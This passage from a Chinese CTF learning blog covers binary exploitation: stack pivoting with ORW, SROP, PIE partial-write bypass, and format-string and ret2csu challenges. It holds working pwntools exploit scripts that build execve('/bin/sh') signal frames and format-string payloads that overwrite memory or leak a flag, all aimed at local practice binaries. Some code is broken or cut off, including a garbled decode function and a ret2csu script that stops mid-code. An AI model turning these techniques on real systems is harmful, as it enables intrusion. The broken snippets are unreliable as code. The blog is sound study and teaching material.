+<p>read里可以写0x100个。但是覆盖完rbp,再覆盖canary。一共是0x30+0x08&#x3D;0x38   还剩0x100-0x38&#x3D;0xD0个<br>一般来说rop链 是rdi+bin&#x2F;sh+&#x2F;sysytem 0x24就可以了。实际上rop链里面要对各个寄存器进行设置。还要调用一些函数。比如说沙箱里的orw<br>最后还要栈对齐什么的。好像0xD0的空间就这样 &#x2F;8之后就只有8个。就是说它只能写8个进去就满了。应该对与沙箱绕过的rop是不够的。栈里面也没有那么大的空间去操作，就迁移到bss段<br>实际上，这道题是格式化字符串，栈迁移和orw的结合。orw的链太长了。原来的栈空间不够，需要迁移到bss段。但首先我们要用格式化字符串泄露canary才能进行栈迁移<br>这里给出exp<br>控制流段1: 泄露信息<br>控制流段2: 栈迁移<br>控制流段3: ROP拼接<br>迁移好以后算出来每个对应的偏移地址。在orw链里给每个寄存器赋值。在新的bss段上调用open read write<br>注意第一次溢出执行leave ret;的时候要把泄露的canary加上。让它通过检查。</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/pwn/" style="color: #00bcd4">pwn</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/ROP/" style="color: #03a9f4">ROP</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/stack-pivot/" style="color: #00a596">stack-pivot</a>
+        </span>
+        
+    </div>
+    <a href="/2025/06/15/%E6%A0%88%E8%BF%81%E7%A7%BB/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2025/06/10/SROP/">
+        <h2 class="post-title">SROP 利用技术</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                二进制安全
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/6/10
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p><code>pwntools</code> 里面有这个类：<code>SigreturnFrame()</code>。它能自动帮你生成对应架构下完美的、对齐的伪造栈帧字节流。  </p>
+<pre><code class="language-python">from pwn import *
+
+# 1. 初始化环境配置 (极其重要，SigreturnFrame 依赖它来决定结构体大小)
+context.arch = &#39;amd64&#39;
+context.os = &#39;linux&#39;
+context.log_level = &#39;debug&#39;
+
+# --- 假设我们已经找到的地址常量 ---
+offset = 40                    # 覆盖到返回地址所需的垃圾数据长度
+syscall_ret = 0x401150         # syscall; ret; 的地址
+set_rax_15_ret = 0x401160      # 假设存在的 gadget: mov rax, 15; ret
+bin_sh_addr = 0x402000         # &quot;/bin/sh&quot; 字符串的地址
+
+io = process(&#39;./vuln_program&#39;)
+
+# ==========================================
+# [ SROP 核心伪造区 ]
+# ==========================================
+# 2. 实例化一个空的信号帧
+frame = SigreturnFrame()
+
+# 3. 像填表一样，填入你期望的寄存器最终状态
+# 我们想要执行: execve(&quot;/bin/sh&quot;, NULL, NULL)
+frame.rax = 59              # 59 是 execve 的系统调用号
+frame.rdi = bin_sh_addr     # 第一个参数: 指向 &quot;/bin/sh&quot;
+frame.rsi = 0               # 第二个参数: NULL
+frame.rdx = 0               # 第三个参数: NULL
+
+# 4. 最关键的一步：现场恢复后，程序接着去哪执行？
+# 既然寄存器已经准备好执行 execve 了，我们必须让 RIP 再次指向 syscall 去触发它
+frame.rip = syscall_ret     
+
+# ==========================================
+# [ 组装 Payload 区 ]
+# ==========================================
+# 第一部分：常规的栈溢出垃圾数据
+payload = b&#39;A&#39; * offset
+
+# 第二部分：触发 sys_sigreturn
+# 也就是让 RAX=15，然后执行 syscall
+payload += p64(set_rax_15_ret) 
+payload += p64(syscall_ret)
+
+# 第三部分：紧跟其后，放上我们伪造的庞大 Signal Frame
+# sys_sigreturn 执行时，会直接把紧挨着它的这块数据当成现场进行恢复
+payload += bytes(frame)
+
+# ==========================================
+# [ 发送与接管 ]
+# ==========================================
+print(&quot;[+] Sending SROP Payload...&quot;)
+io.sendline(payload)
+
+# 享受你的 Shell
+io.interactive()
+</code></pre>
+<p>SROP (Sigreturn Oriented Programming) 的本质，是<strong>利用操作系统内核（Kernel）对栈数据的“盲目信任”</strong>。</p>
+<h4 id="1-正常的信号处理流程"><a href="#1-正常的信号处理流程" class="headerlink" title="1. 正常的信号处理流程"></a>1. 正常的信号处理流程</h4><p>假设你的程序正在运行，突然产生了一个异常（比如你按了 Ctrl+C 触发了 <code>SIGINT</code>），或者定时器到了（<code>SIGALRM</code>）。系统是怎么处理的？</p>
+<ol>
+<li><strong>打断执行，保存现场：</strong> 内核（Kernel）会强行暂停你的程序。为了等会儿能恢复，内核会把你当前所有的 CPU 寄存器（RAX, RDI, RIP, RSP, 段寄存器等）全部打包，<strong>推到你的用户态栈（User Stack）上</strong>。这个巨大的数据包，就是 <strong>Signal Frame（信号帧）</strong>。</li>
+<li><strong>执行处理函数：</strong> 内核把 <code>RIP</code> 指向对应的信号处理函数去执行。</li>
+<li><strong>恢复现场 (</strong><code>**sigreturn**</code><strong>)：</strong> 处理结束后，程序会调用一个特殊的系统调用 <code>sys_sigreturn</code>（64位下调用号是 15）。内核收到这个调用后，会去栈上把刚才存的 Signal Frame 拿出来，<strong>然后塞回所有的硬件寄存器里</strong>，程序就像什么都没发生一样继续运行。</li>
+</ol>
+<h4 id="2-逻辑漏洞"><a href="#2-逻辑漏洞" class="headerlink" title="2. 逻辑漏洞"></a>2. 逻辑漏洞</h4><p>一个致命的逻辑漏洞：<strong>内核在执行 <strong><code>**sys_sigreturn**</code></strong> 恢复现场时，根本不检查栈上的 Signal Frame 是不是原来自己保存的那个！</strong></p>
+<p>只要你：</p>
+<ol>
+<li>用栈溢出，在栈上填满一个<strong>伪造的 Signal Frame</strong>。</li>
+<li>想办法让 <code>RAX = 15</code>。</li>
+<li>执行 <code>syscall</code> 指令。</li>
+</ol>
+<p>内核会把伪造的数据当成合法的现场，原封不动地塞进 CPU 的每一个寄存器。</p>
+<h3 id="什么时候不能用-SigreturnFrame-？"><a href="#什么时候不能用-SigreturnFrame-？" class="headerlink" title="什么时候不能用 SigreturnFrame()？"></a>什么时候不能用 <code>SigreturnFrame()</code>？</h3><p><code>pwntools</code> 的 <code>SigreturnFrame()</code> </p>
+<ol>
+<li><strong>无 Python&#x2F;无 pwntools 环境：</strong> 实战打某些内网机器，或者写 C 语言的 Exploit 时，只能依靠底层的结构体和系统调用，不能依赖 Python 库。</li>
+<li><strong>特殊架构或老旧内核：</strong><code>pwntools</code> 里的结构体模板是固定的（基于较新的主流 Linux）。遇到偏门的 MIPS 路由器，或者魔改过内核的 IoT 设备，它的帧结构偏移是对不上的，用 <code>pwntools</code> 生成发过去直接段错误。</li>
+<li><strong>栈空间极其有限：</strong> 64 位下的一个完整 Signal Frame 长达 <strong>248 字节</strong>。如果程序的溢出长度只有 100 字节怎么办？ 用不了 <code>SigreturnFrame()</code>！这时候我们需要“<strong>部分伪造</strong>”——只精准覆盖前几个关键寄存器（如 RDI, RSI, RIP），后面利用栈上原有的残余数据碰运气，这种骚操作只能手写。我觉得也能栈迁移继续写</li>
+<li><strong>绕过沙箱 (Bypass Seccomp)：</strong> 有时候你需要在一个帧里嵌套另一个帧，或者利用帧的某些未定义字段，直接利用库函数无法修改这些</li>
+</ol>
+<p>手搓信号帧，是<strong>根据 Linux 内核源码中的 <strong><code>**ucontext_t**</code></strong> 结构体，对着偏移量在特定的字节位置填入你想要的值。</strong></p>
+<h4 id="1-设置好段寄存器"><a href="#1-设置好段寄存器" class="headerlink" title="1. 设置好段寄存器"></a>1. 设置好段寄存器</h4><p>手写最容易失败的原因在于：<strong>你必须提供合法的段寄存器（CS, SS 等）</strong>。 在 64 位 Linux 下：</p>
+<ul>
+<li>代码段寄存器 <code>**CS**</code>** 必须是 **<code>**0x33**</code></li>
+<li>栈段寄存器 <code>**SS**</code>** 必须是 **<code>**0x2b**</code></li>
+</ul>
+<p>如果这两个值是 0，<code>sys_sigreturn</code> 恢复上下文后，CPU 在用户态一切换，立刻因为权限异常触发 <code>Segmentation Fault</code>段错误。</p>
+<p>手写模板</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+from pwn import *
+import struct
+
+# ==========================================
+# [ 1. 核心武器库：手搓 Signal Frame ]
+# ==========================================
+class HandcraftedSigFrame:
+    &quot;&quot;&quot;
+    纯手工构建 64 位 Linux ucontext_t 结构体
+    总长度: 248 bytes (0xf8)
+    &quot;&quot;&quot;
+    def __init__(self):
+        # 初始化 248 字节的 0 (内核其实不关心没有用到的字段)
+        self.frame = bytearray(b&#39;\x00&#39; * 248)
+        
+        # --- 设置一些极其关键的默认值 (防止内核恢复现场时崩溃) ---
+        # 1. eflags: 必须包含合法标志，0x202 (IF, 中断允许标志位开启) 是最稳妥的
+        self.set_reg(&#39;eflags&#39;, 0x202)
+        
+        # 2. 段寄存器 (Segment Registers): x86_64 下的死规定
+        # 如果 CS != 0x33，CPU 会瞬间抛出权限异常 (General Protection Fault)
+        self.frame[0xb8:0xba] = struct.pack(&#39;&lt;H&#39;, 0x33) # CS = 0x33
+        self.frame[0xba:0xbc] = struct.pack(&#39;&lt;H&#39;, 0x00) # GS = 0
+        self.frame[0xbc:0xbe] = struct.pack(&#39;&lt;H&#39;, 0x00) # FS = 0
+        self.frame[0xbe:0xc0] = struct.pack(&#39;&lt;H&#39;, 0x2b) # SS = 0x2b
+
+    def set_reg(self, reg_name, val):
+        &quot;&quot;&quot;
+        根据 Linux 内核源码的偏移量，精准覆写 8 字节寄存器
+        &quot;&quot;&quot;
+        offsets = &#123;
+            &#39;r8&#39;: 0x28,  &#39;r9&#39;: 0x30,  &#39;r10&#39;: 0x38, &#39;r11&#39;: 0x40,
+            &#39;r12&#39;: 0x48, &#39;r13&#39;: 0x50, &#39;r14&#39;: 0x58, &#39;r15&#39;: 0x60,
+            &#39;rdi&#39;: 0x68, &#39;rsi&#39;: 0x70, &#39;rbp&#39;: 0x78, &#39;rbx&#39;: 0x80,
+            &#39;rdx&#39;: 0x88, &#39;rax&#39;: 0x90, &#39;rcx&#39;: 0x98, &#39;rsp&#39;: 0xa0,
+            &#39;rip&#39;: 0xa8, &#39;eflags&#39;: 0xb0
+        &#125;
+        if reg_name in offsets:
+            offset = offsets[reg_name]
+            # &lt;Q 代表小端序, 8 字节无符号整数 (64位机器标准)
+            self.frame[offset:offset+8] = struct.pack(&#39;&lt;Q&#39;, val)
+        else:
+            raise ValueError(f&quot;Unknown register: &#123;reg_name&#125;&quot;)
+
+    def build(self):
+        return bytes(self.frame)
+
+# ==========================================
+# [ 2. 全局环境与偏移配置 ]
+# ==========================================
+# 这里仅使用 pwntools 进行网络通信和 ELF 解析
+context.arch = &#39;amd64&#39;
+context.log_level = &#39;debug&#39;
+
+# 目标程序 (这里假设漏洞程序名为 vuln)
+# io = process(&#39;./vuln&#39;)
+# io = remote(&#39;127.0.0.1&#39;, 1337)
+
+# --- 假设我们前期收集到的地址和 Gadget ---
+# (实战中你需要用 ROPgadget 工具或者 ELF() 去找这些地址)
+padding_size = 40                  # 栈溢出覆盖到 ret 所需的垃圾数据长度
+syscall_ret = 0x401150             # `syscall; ret;` 的地址
+set_rax_15_ret = 0x401160          # 假设的触发 Gadget: `mov rax, 15; ret;`
+bin_sh_addr = 0x402000             # 字符串 &quot;/bin/sh&quot; 所在的内存地址
+
+# ==========================================
+# [ 3. 构造与执行攻击 ]
+# ==========================================
+def pwn():
+    print(&quot;[+] 正在手动组装 Signal Frame...&quot;)
+    frame = HandcraftedSigFrame()
+    
+    # 填表时间：布置我们期望的寄存器状态 (目标：execve(&quot;/bin/sh&quot;, 0, 0))
+    frame.set_reg(&#39;rax&#39;, 59)            # 59 是 execve 的调用号
+    frame.set_reg(&#39;rdi&#39;, bin_sh_addr)   # 参数 1: &quot;/bin/sh&quot; 字符串指针
+    frame.set_reg(&#39;rsi&#39;, 0)             # 参数 2: NULL
+    frame.set_reg(&#39;rdx&#39;, 0)             # 参数 3: NULL
+    frame.set_reg(&#39;rip&#39;, syscall_ret)   # [关键]: 现场恢复后，立即执行 syscall
+
+    # 可选：如果你需要做连环 ROP，可以把 RSP 劫持到一个新的可控地址
+    # frame.set_reg(&#39;rsp&#39;, 0x403000) 
+
+    # 组装完整的恶意 Payload
+    payload = b&#39;A&#39; * padding_size       # 1. 垃圾数据，填满溢出空间
+    payload += p64(set_rax_15_ret)      # 2. 控制 RAX = 15 (sys_sigreturn)
+    payload += p64(syscall_ret)         # 3. 触发系统调用，内核开始去栈上取假现场
+    payload += frame.build()            # 4. 纯手工捏造的 248 字节假现场紧随其后
+
+    print(&quot;[+] Payload 组装完毕，长度:&quot;, len(payload))
+    print(&quot;[+] 正在发送 Payload 接管控制流...&quot;)
+    
+    # io.sendline(payload)
+    # io.interactive()
+
+if __name__ == &#39;__main__&#39;:
+    pwn()
+</code></pre>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/pwn/" style="color: #ffa2c4">pwn</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/SROP/" style="color: #00bcd4">SROP</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/ROP/" style="color: #03a9f4">ROP</a>
+        </span>
+        
+    </div>
+    <a href="/2025/06/10/SROP/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2025/06/01/PIE/">
+        <h2 class="post-title">PIE 保护原理与绕过</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                二进制安全
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/6/1
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>开了之后.text段的地址只剩下最后的四个数字了，这个地址并不是程序实际的运行地址，而是与程序加载基址之间的偏移量。如果没有开启pie保护，程序的加载基址默认是0x400000，现在开启了pie保护后每次运行程序的加载基址都是不同的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1766281423248-45c3f32c-f662-40bb-a9c1-9538a88628f3.png"></p>
+<p>程序的实际运行地址 &#x3D; 程序加载基址 + 程序偏移地址</p>
+<p>程序开启了pie保护，当我们在使用pwngdb对程序进行调试的时候无法下断点</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1766281517414-55e6f109-c02a-47a6-b3de-c6a0d597606f.png"></p>
+<p>通过</p>
+<pre><code class="language-plain">b *$rebase(0x13F9)
+</code></pre>
+<p>来进行调试。括号里是ida里的偏移量</p>
+<h2 id="有fmt"><a href="#有fmt" class="headerlink" title="有fmt"></a>有fmt</h2><pre><code>  如果程序有格式化字符串漏洞。那么我们可以通过格式化字符串漏洞泄露出某一条指令的真实地址，再用真实地址减去偏移地址，就能得到程序的加载基址了。
+
+  简单的方法是我们先调试。找到一个指令的地址。然后我们再去ida里找见对应的偏移。然后减去对应的。算出来地址即可。
+
+  fmt泄露地址可以。如果还有其它方法可以泄露也是可以的。我们主要是要算pie地址
+</code></pre>
+<h2 id="partial-write"><a href="#partial-write" class="headerlink" title="partial write"></a>partial write</h2><p>不管程序加载基址怎么变化，偏移量和真实地址的最后三位都是一样的，</p>
+<blockquote>
+<p><strong>partial write(部分写入)就是一种利用了PIE技术缺陷的bypass技术。由于内存的页载入机制，PIE的随机化只能影响到单个内存页。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的。因此通过覆盖EIP的后8或16位 (按字节写入，每字节8位)就可以快速爆破或者直接劫持EIP。</strong></p>
+</blockquote>
+<pre><code>因为程序运行起来的时候开启了pie和aslr，无法获取程序的准确地址，但是虽然前面的地址是不知道的，但是一个内存分页的大小为`**0x1000**`，这基本上确定了，偏移地址只能在`**0~999**`之间，一般情况下，返回地址都会在一个内存分页上，所以覆盖返回地址的后三位，从而执行`**backdoor**`函数。要是分了两页就没办法
+
+
+我们可以通过栈溢出覆盖掉buf和rbp的内容，再修改return addr的后三位数，因为我们无法修改一个半字节，所以我们只能修改两个字节，我们将return addr中的\x76修改成\x3e，\x05就有16种结果了，因为我们知道的只有后三位数，倒数第四位数我们是不知道的，所以就有[\x0a,\x1a,\x2a,\x3a,\x4a,\x5a,\x6a,\x7a,\x8a,\x9a,\xaa,\xba,\xca,\xda,\xea,\xfa]，我们稍微爆破一下就好了。
+</code></pre>
+<p>多试几次本来就是爆破</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/pwn/" style="color: #ffa2c4">pwn</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/PIE/" style="color: #ff7d73">PIE</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/ASLR/" style="color: #03a9f4">ASLR</a>
+        </span>
+        
+    </div>
+    <a href="/2025/06/01/PIE/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2025/05/25/fmt%E5%92%8Cretcsu/">
+        <h2 class="post-title">格式化字符串与 ret2csu</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                二进制安全
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/5/25
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h2 id="fmt1"><a href="#fmt1" class="headerlink" title="fmt1"></a>fmt1</h2><p>首先来看一下这道fmt1</p>
+<p>先来分析一下main函数。里面这个ctfshow可能存在漏洞点</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530572509-c5da82e5-e24d-42f4-b3a5-8bb418f3ce24.png"></p>
+<p>再看底下如果daniu等于6，就会触发shell。把这个daniu写成6就行了。用栈溢出或者格式化字符串。这个既然都写fmt了。应该是要格式化字符串的。</p>
+<p>先假装不知道看一下这个ctfshow函数。拿ai计算了一下为啥不能栈溢出</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530572665-69d84379-4566-40f2-84b0-b3a0c7edcdb2.png"></p>
+<p>算出来这个v2的地址离s还有1个字节。也就是没法栈溢出的</p>
+<pre><code class="language-plain">s的结束地址 = ebp-0x5C + 79 = ebp-0x5C + 0x4F = ebp-0xD
+v2的地址   = ebp-0xC
+间隔       = ebp-0xC - (ebp-0xD) = 1字节
+</code></pre>
+<p>格式化字符串怎么写一下这个payload</p>
+<p>用readlef找一下这个daniu的地址</p>
+<pre><code class="language-plain">readelf -s ./fmt1 | grep daniu
+</code></pre>
+<p>然后确定偏移量</p>
+<p>构造一个包含 <strong>唯一标记</strong>（如 <code>AAAA</code>）和多个 <code>%p</code> 的字符串，发送到程序：</p>
+<p>寻找 <code>AAAA</code> 的十六进制形式 <code>0x41414141</code> 在输出中的位置。 上例中 <code>0x41414141</code> 出现在第 <strong>3</strong> 个 <code>%p</code> 的位置，因此偏移量 <strong>k &#x3D; 3</strong>。</p>
+<p>这是在网上找的方法，还不知道具体原理</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530572693-b9b4eb01-0b5b-4ac8-853f-7a014329757c.png"></p>
+<p>在第七个，然后用自动生成的工具生成</p>
+<pre><code class="language-plain">payload = fmtstr_payload(7, &#123;daniu: 6&#125;)
+</code></pre>
+<p>exp</p>
+<pre><code class="language-python">from pwn import*
+context(arch=&#39;i386&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+p=process(&#39;./fmt1&#39;)
+gdb.attach(p,&#39;b main&#39;)
+
+daniu = 0x804b038
+payload = fmtstr_payload(7, &#123;daniu: 6&#125;)
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>（第一次没弄好。忘把context里的arch改成i386了🙂）</p>
+<h2 id="fmt2"><a href="#fmt2" class="headerlink" title="fmt2"></a>fmt2</h2><p>这道题先分析反汇编</p>
+<p>我们可以看到它定义了好多变量还是地址的东西（v6~v12）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530572802-46b6019b-0f34-41a8-b4da-b5fcd4f6dc01.png"></p>
+<p>然后它和上一道题一样它有一个 v12 &#x3D; __readfsqword(0x28u);栈保护。</p>
+<p>这道题应该是可以栈溢出的。应该也是算一下v12到s的距离。</p>
+<h2 id="思路是要格式化字符串泄露flag"><a href="#思路是要格式化字符串泄露flag" class="headerlink" title="思路是要格式化字符串泄露flag"></a>思路是要格式化字符串泄露flag</h2><p>这道题就是要读取栈上某一个特定空间的的内容。flag规定在那个地方里。它到那个地方会自动读取系统里叫flag.txt的文件。做到payload可以读取</p>
+<p>第一次在网上找了一种思路。这道题flag在栈上，那就要想办法通过格式化字符串泄露栈上的数据。就是要泄露s的里面的东西</p>
+<p>自动生成的fmtstr_payload是用来覆盖的。要读取flag就需要手写一个。但是这手写就比较难</p>
+<p>思路是这样的，要先通过格式化字符串泄露一次栈上的数据。然后再泄露flag</p>
+<p>先要写泄露栈地址的（第一次是照着网上模仿的写的）.要发送一个payload,再接收</p>
+<p>这个%n$p 就是说以指针形式读取栈上第n个参数的值。</p>
+<p>然后接下来处理数据，遇到#就不接收。新学了一个这个</p>
+<pre><code class="language-plain">drop=True
+</code></pre>
+<p>丢弃结束符用的。然后空指针（nil）替换成0.（这个是问ai哪有问题的时候它加的）</p>
+<p>最后将接收到的data1按16进制0x分割。</p>
+<pre><code class="language-sql">p.sendlineafter(b&#39;Echo as a service\n&#39;, b&#39;%12$p%13$p%14$p%15$p#&#39;)
+data1 = p.recvuntil(b&#39;#&#39;, drop=True).decode().replace(&#39;(nil)&#39;, &#39;0&#39;)
+parts1 = data1.split(&#39;0x&#39;)[1:]  # 提取有效地址部分
+</code></pre>
+<p>我第一次写的时候是没有这个for循环来处理16进制字符串长度的（后续再说这个）</p>
+<p>字节的小端序转换</p>
+<pre><code class="language-plain">bytes.fromhex(&#39;67616c66&#39;) → b&#39;galf&#39;  
+[::-1] → b&#39;flag&#39;  # 反转后得到正确顺序
+</code></pre>
+<p>这样多次拼接就可以拼出flag</p>
+<p>第一次直接照着网上的这样写，直接用了一下</p>
+<pre><code class="language-plain">b.pop(0) #它说这个是移除第一个元素
+c = [bytes.fromhex(i)[::-1] for i in b]
+d = b&#39;&#39;.join(c)
+</code></pre>
+<p>最后打印出来泄露的东西</p>
+<p>第二次泄露跟第一次差不多，要注意的就是泄露的第几个参数的值改一下</p>
+<p>第一次的exp：</p>
+<pre><code class="language-python">from pwn import *
+
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+p = process(&quot;./fmt2&quot;)
+gdb.attach(p, &#39;b main&#39;)
+
+p.sendlineafter(b&#39;Echo as a service\n&#39;, b&#39;%12$p%13$p%14$p%15$p#&#39;)
+data1 = p.recvuntil(b&#39;#&#39;, drop=True).decode().replace(&#39;(nil)&#39;, &#39;0&#39;)
+parts1 = data1.split(&#39;0x&#39;)[1:] 
+b.pop(0)
+c = [bytes.fromhex(i)[::-1] for i in b]  
+d = b&#39;&#39;.join(c)
+
+p.sendlineafter(b&#39;Echo as a service\n&#39;, b&#39;%16$p%17$p%18$p%19$p#&#39;)
+data2 = p.recvuntil(b&#39;#&#39;, drop=True).decode().replace(&#39;(nil)&#39;, &#39;0&#39;)
+parts2 = data1.split(&#39;0x&#39;)[1:] 
+b.pop(0)
+c = [bytes.fromhex(i)[::-1] for i in b]  
+d = b&#39;&#39;.join(c)
+print(d)
+
+p.interactive()
+</code></pre>
+<p>然后它报这个错</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530572681-a301c06b-5475-45ff-acd4-921e1e418f6b.png"></p>
+<p>查了以后这个报错说是16进制字符串转化成字节的时候遇到了非法字符</p>
+<p>我以为是我写的不规范，把这个网上找的转换的这段重新写一下。</p>
+<pre><code class="language-python">raw_bytes = b&#39;&#39;
+byte_data = bytes.fromhex(addr)
+reversed_bytes = byte_data[::-1]
+raw_bytes += reversed_bytes
+</code></pre>
+<p>发现还是和原来一样的报错</p>
+<p>然后这中间还有一个问题。我没写这个.txt文件😐。补充.txt文件</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530573531-b35b908e-9ddb-4ed9-8c15-465cb31bf7ba.png"></p>
+<p>然后我问ai,它回答这个</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530573587-dd9df222-75b7-432b-a0d6-2d8f7b1c6587.png"></p>
+<p>可能这个flag转换的时候出现了奇数长度。总之要想办法转换</p>
+<p>这ai底下直接给了一个for循环，把原来泄露的都能成功接收了。（这也太好了吧）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530573686-fe5b2474-cc45-4af3-83f3-cba809fa5d7e.png"></p>
+<p>然后还扩展了一下混合的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530573479-2771243b-4cb4-4053-9ccb-ceed6dbc86ea.png"></p>
+<p>把这段for循环的放到接收处理数据那一块。最后再改一下转换，打印。</p>
+<p>（这个试的时候到12个printf后面就是flag。其实第10个就有flag了）</p>
+<h2 id="从第几个开始写"><a href="#从第几个开始写" class="headerlink" title="从第几个开始写"></a>从第几个开始写</h2><p>64位，它前六个在寄存器里。从第7个之后开始写都行。</p>
+<p>先算偏移量</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530573810-7deb0323-5186-4b17-b3b7-3a9041a19964.png"></p>
+<p>是8</p>
+<p>再算s到格式化字符串.rbp-40可以算一下s</p>
+<p>这个我不太会算。看了答案以后知道是从12个。就开始试。它这fgets有个限制最多只能写50个字节覆盖s。这个发payload的时候不要超过50个。一个%12$是8个，先发4个试一下</p>
+<pre><code class="language-plain">fgets(s, 50, stream);
+</code></pre>
+<p>这是9的时候：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530574298-7a082a40-4648-45ea-a487-6d7cbb0c1e12.png"></p>
+<p>10：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530574249-a7b12da0-8bdf-4b89-b38c-19fe07741058.png"></p>
+<p>最终exp（终于对了一次）</p>
+<pre><code class="language-python">from pwn import *
+
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+p = process(&quot;./fmt2&quot;)
+gdb.attach(p, &#39;b main&#39;) 
+
+p.sendlineafter(b&#39;Echo as a service\n&#39;, b&#39;%12$p%13$p%14$p%15$p#&#39;)
+data1 = p.recvuntil(b&#39;#&#39;, drop=True).decode().replace(&#39;(nil)&#39;, &#39;0&#39;)
+parts1 = data1.split(&#39;0x&#39;)[1:] 
+raw_bytes = b&#39;&#39;
+for addr_part in parts1:
+    if len(addr_part) % 2 != 0:
+        addr_part = &#39;0&#39; + addr_part
+    padded = addr_part.ljust(16, &#39;0&#39;)  
+    raw_bytes += bytes.fromhex(padded)[::-1]
+
+p.sendlineafter(b&#39;Echo as a service\n&#39;, b&#39;%16$p%17$p%18$p%19$p#&#39;)
+data2 = p.recvuntil(b&#39;#&#39;, drop=True).decode().replace(&#39;(nil)&#39;, &#39;0&#39;)
+parts2 = data2.split(&#39;0x&#39;)[1:]
+for addr_part in parts2:
+    if len(addr_part) % 2 != 0:
+        addr_part = &#39;0&#39; + addr_part
+    padded = addr_part.ljust(16, &#39;0&#39;) 
+    raw_bytes += bytes.fromhex(padded)[::-1]
+
+print(&quot;flag is in the behide :&quot;, raw_bytes)
+p.interactive()
+</code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530574296-5a7cd76f-6757-453a-ac3a-ddb647061c64.png"></p>
+<p>这个最后如果要提交的话要记得去掉 \x00 把用零补齐的去掉</p>
+<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><h2 id="retcsu"><a href="#retcsu" class="headerlink" title="retcsu"></a>retcsu</h2><p>retcsu跟libc有点像</p>
+<p>这是第一次它说接收有点问题。</p>
+<pre><code class="language-python">from pwn import *
+
+# 设置调试环境
+p = process(&#39;./ret2csu&#39;)
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;info&#39;)
+
+# 加载文件
+elf = ELF(&#39;./ret2csu&#39;)
+libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+
+def dec(data):
+    # 解密过程：先异或还原，再逆向位移操作
+    result = []
+    for byte in data:
+        xor_byte = byte ^ 0x5A
+        # 2. 逆向位移操作（加密是右移3位+左移5位）
+        # 解密需要左移3位 + 右移5位（合并后等价循环左移3位）
+        original = ((xor_byte &gt; 5)) &amp; 0xFF
+        result.append(original)
+    return bytes(result)
+
+# 第一阶段：泄露write地址
+
+# 准备溢出数据
